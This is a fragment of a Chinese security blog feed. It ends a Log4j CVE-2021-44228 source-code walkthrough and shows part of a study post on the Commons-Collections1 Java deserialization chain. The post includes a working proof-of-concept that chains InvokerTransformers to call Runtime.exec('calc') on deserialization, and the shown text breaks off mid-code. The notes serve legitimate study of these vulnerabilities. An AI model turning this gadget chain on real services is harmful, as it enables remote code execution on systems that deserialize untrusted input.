src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733840438808-eab97513-e5d7-496f-923a-cc22710cf6a4.png" alt=""></p><p>这里的关键点在于for循环里主要判断在workingBuilder中是否存在${}格式的占位符，如果存在，就调用config.getStrSubstitutor().replace(event, value)方法进行替换。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733840743531-077c94ca-f8e0-4c70-8dba-fba759399d97.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733840826689-a9df9f50-07d4-4e95-8c72-4edc3e917df0.png" alt=""></p><p>这里会先进入AbstractConfiguration类的getStrSubstitutor方法会直接返回StrSubstitutor对象</p><p>�所以跟进这个类的replace方法里去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733840909967-f218a5d6-a205-4dca-a45a-860e4c5d21d9.png" alt=""></p><p>创建一个StringBuilder对象buf，并将source作为初始内容，调用substitute方法进行替换操作，如果没有进行替换，则返回原始的source字符串。跟进看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733840995137-9c65db36-86ac-440f-b774-0feff4d18e5b.png" alt=""></p><p>继续跟进</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733841064478-c5cde0dd-bf9a-486c-b474-baabe31bf11d.png" alt=""></p><p>看关键点在这个while循环里，这里我直接参考su18佬和师哥的解释</p><p>参考：<a href="https://xz.aliyun.com/t/13077">https://xz.aliyun.com/t/13077</a></p><p><a href="https://tttang.com/archive/1378/#toc_0x00">https://tttang.com/archive/1378/#toc_0x00</a></p><p>然后继续跟到resolveVeriable方法里</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733841298061-5c44f633-12ec-4ded-b3df-fbc393054431.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733841355807-be708652-b470-4f01-8e85-4e1ee055dfc6.png" alt="">这里会掉用Interpolator类的lookup方法跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733841450543-9dfa583c-b13d-45d4-8b7a-1153710d20c5.png" alt=""></p><p>这里会调用jndiLookup类的lookup方法继续跟进</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733841488266-ebf37dee-7906-4624-8db1-96973cec007b.png" alt=""></p><p>然后会调用JndiManager类的lookup方法跟进</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733841521882-9f02d719-2cd1-4ba8-98df-d92e30455aa4.png" alt=""></p><p>这里会调用InitialContext类的lookup方法之后就是jndi的利用了</p><p>这里引用师哥的总结</p><p>三个关键点：</p><blockquote><ol><li>在PatternLayout类的toSerializable方法中，调用MessagePatternConverter的format方法，这个方法是一个格式化的过程，将格式化的内容添加到workingBuilder中，也就是将源代码中的message替换{}，同时匹配字符串中是否存在${}占位符，并使用config.getStrSubstitutor().replace进行替换</li><li>在StrSubstitutor类的substitute方法中，提取${}中的内容，并调用StrSubstitutor类resolveVariable方法对其解析</li><li>在Interpolator类的lookup方法中，根据前缀在map中获取对应的StrLookup对象，然后调用其lookup方法，这里的前缀为jndi，所以获取的是JndiLookup对象，然后调用其lookup方法，这个方法调用了jndiManager.lookup方法</li></ol></blockquote><h2 id="rc1">rc1</h2><p>参考<a href="https://xz.aliyun.com/t/13077">https://xz.aliyun.com/t/13077</a></p><p><a href="https://tttang.com/archive/1378/">https://tttang.com/archive/1378</a>/</p><p>写的很详细自己就不跟了直接看原文更好</p><p>不出网的一些方式</p><p>参考：<a href="https://cloud.tencent.com/developer/article/2036012">https://cloud.tencent.com/developer/article/2036012</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CVE-2021-44228&quot;&gt;CVE-2021-44228&lt;/h2&gt;
&lt;h3 id=&quot;环境搭建&quot;&gt;环境搭建&lt;/h3&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span </summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="反序列化" scheme="https://oceanzbz.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="Log4j" scheme="https://oceanzbz.github.io/tags/Log4j/"/>
    
  </entry>
  
  <entry>
    <title>Commons-Collections1反序列化</title>
    <link href="https://oceanzbz.github.io/post/3b30efaa.html"/>
    <id>https://oceanzbz.github.io/post/3b30efaa.html</id>
    <published>2024-12-30T06:47:06.000Z</published>
    <updated>2025-03-05T07:24:36.786Z</updated>
    
    <content type="html"><![CDATA[<h2 id="TranformedMap">TranformedMap</h2><p>复习一遍之前学过的，由于太过久远导致基本全部忘记了，还有就是当时的笔记记得太过于潦草导致根本没法复习。</p><p>这次重新跟一遍cc1链。</p><h3 id="环境搭建">环境搭建</h3><p>具体搭建可以参考bilibili的白日梦组长。</p><p>就是将下载jdk  8u71以下的版本，然后在下载对应的openjdk将里面的sun包复制过来，然后注意Commons-Collections的版本为3.2.1。</p><h3 id="函数介绍">函数介绍</h3><h4 id="Transformer">Transformer</h4><p>Transformer是一个接口，只有一个带实现的方法；<br>TransformedMap在转换Map的新元素时，就会调⽤transform⽅法，这个过程就类似在调⽤⼀个“回调<br>函数”，这个回调的参数是原始对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="InvokerTransformer">InvokerTransformer</h4><p><font style="color:rgb(51, 51, 51);">InvokerTransformer是实现了Transformer、Serializable接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序<br></font>列化能执⾏任意代码的关键；</p><p>在实例化这个InvokerTransformer时，需要传⼊三个参数：</p><ul><li>第⼀个参数是待执⾏的⽅法名</li><li>第⼆个参数是这个函数的参数列表的参数类型</li><li>第三个参数是传给这个函数的参数列表</li></ul><p>后面transform方法，通过反射调用执行了input对象的iMethodName方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Transforms the input to result by invoking a method on the input.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> input  the input object to transform</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the transformed result, null if null input</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h4 id="ChainedTransformer">ChainedTransformer</h4><p>ChainedTransformer是实现了Transformer、Serializable接⼝的⼀个类，它的作⽤是将内部的多个Transformer串在⼀起，将前一个回调返回的结果作为后一个的参数传入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Transforms the input to result via each decorated transformer</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> object  the input object passed to the first transformer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the transformed result</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="ConstantTransformer">ConstantTransformer</h4><p>ConstantTransformer是实现了Transformer、Serializable接口的一个类，它的过程就是在构造函数的时候传入一个对象，并在transform方法将这个对象再返回；</p><p>作用就是包装任意一个对象，在执行回调时返回这个对象，进而方便后续操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Transforms the input by ignoring it and returning the stored constant instead.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> input  the input object which is ignored</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the stored constant</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Transfomed">Transfomed</h4><p>TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可以执⾏⼀个回调。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMap</span> <span class="keyword">extends</span> <span class="title class_">AbstractInputCheckedMapDecorator</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">        key = transformKey(key);</span><br><span class="line">        value = transformValue(value);</span><br><span class="line">        <span class="keyword">return</span> getMap().put(key, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">putAll</span><span class="params">(Map mapToCopy)</span> &#123;</span><br><span class="line">        mapToCopy = transformMap(mapToCopy);</span><br><span class="line">        getMap().putAll(mapToCopy);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="调用链过程">调用链过程</h3><p>先来看一下Transfomed的poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//        //正常获取runtime实例</span></span><br><span class="line"><span class="comment">//        Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//        //反射获取 runtime实例,并执行代码</span></span><br><span class="line"><span class="comment">//        Class c = Runtime.class;</span></span><br><span class="line"><span class="comment">//        Method getRuntimeMethod = c.getMethod(&quot;getRuntime&quot;, null);</span></span><br><span class="line"><span class="comment">//        Runtime runtime = (Runtime) getRuntimeMethod.invoke(null, null);</span></span><br><span class="line"><span class="comment">//        Method execMethod = c.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//        execMethod.invoke(runtime,&quot;calc&quot;);</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//        //InvokerTransformer方法获取runtime实例，并执行代码</span></span><br><span class="line"><span class="comment">//        Method  getRuntimeMethod = (Method) new InvokerTransformer(&quot;getRuntime&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//        Runtime runtime = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);</span></span><br><span class="line"><span class="comment">//        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime);</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">//通过ChainedTransformer实现 InvokerTransformer方法获取runtime实例，并执行代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"> </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//chainedTransformer.transform(Runtime.class);</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">//创建构造器</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">//保证可以访问到</span></span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//实例化传参，注解和构造好的Map</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line"> </span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实通过上面的函数介绍可以知道invokerTransformer中的transform方法就是一个可以调用任意类中的方法的一个函数，所以它在这里算是我们反序列化最终执行的点来进行恶意操作。那么下面我们就需要找到一个谁调用了这个transform方法，我们可以在序列化的时候将调用这个方法的对象给改成invokerTransformer对象</p><p>所以第一步我们找到了一个调用该方法的函数是TransformedMap中的CheckSetValue方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714487775144-4f98f606-3add-4d77-ad37-f4daee4d213b.png" alt=""></p><p>通过对该类的构造方法的分析可以看到我们可以传入三个参数具体如下代码所示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//接受三个参数，第一个为Map,我们可以传入之前讲到的HashMap,第二个和第三个就是Transformer我们需要的了，可控。</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//接受一个对象类型的参数</span></span><br><span class="line"><span class="comment">//返回valueTransformer对应的transform方法，那么我们这里就需要让valueTransformer为我们之前的invokerTransformer对象</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以我们可以在传入valueTransformer这个参数时让其为invokerTransformer对象，但是由于该类是protected的类型所以不能直接实例化，但是我们发现该类中有一个静态方法 decorate()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>所以可以直接调用该方法，将invokerTransformer对象注入进去。此时CheckSetValue中的valueTransformer就可以被我们改为invokerTransformer对象。那么接下来就需要找到一个可以触发CheckSetValue的方法。通过调试可以找到一个MapEntry类中的setValue方法调用了该方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** The parent map */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(entry);</span><br><span class="line">            <span class="built_in">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">            value = parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在MapEntry方法中，Entry代表的是Map中的一个键值对，而我们在Map中我们可以看到有setValue方法，而我们在对Map进行遍历的时候可以调用setValue这个方法。简单来说就是通过通过对setValue()方法的调用来触发checkSetValue()方法 MapEntry的父类AbstractMapEntryDecorator又引入了Map.Entry接口，所以我们只需要进行常用的Map遍历，就可以调用setValue()，，然后水到渠成的调checkSetValue()</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714488730452-190b8a98-e1fa-4f85-8bf0-c42460d081fe.png" alt=""></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 